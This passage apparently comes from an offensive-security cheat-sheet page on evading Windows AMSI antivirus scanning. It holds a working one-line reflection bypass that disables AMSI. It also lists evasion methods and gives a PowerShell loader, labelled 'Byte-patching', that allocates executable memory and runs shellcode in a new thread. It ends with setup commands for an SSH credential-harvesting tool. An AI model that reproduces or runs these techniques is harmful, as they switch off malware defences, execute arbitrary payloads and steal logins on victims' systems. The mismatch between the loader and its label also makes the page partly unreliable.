[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```


3. String obfuscation: This method involves obfuscating the malicious code to evade AMSI detection.

4. AMSI patching: This method involves patching AMSI to bypass the inspection entirely.

5. Using alternative PowerShell hosts: This method involves using alternative PowerShell hosts that don't load AMSI modules.



Byte-patching:

```
Add-Type -MemberDefinition '
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);
' -Namespace Win32
$shellcode = [System.Text.Encoding]::UTF8.GetBytes('MY_SHELLCODE_HERE')
$mem = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [System.IntPtr]($mem), $shellcode.Length)
$thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
```

 ## SSH Harvester
    
 ```
 https://github.com/jm33-m0/SSH-Harvester
    
 sudo ./start_sshd.sh

# in another terminal
./inject.sh

# then
ssh -p2222 user@localhost

# check what happens   
 ```
  

{% include links.html %}
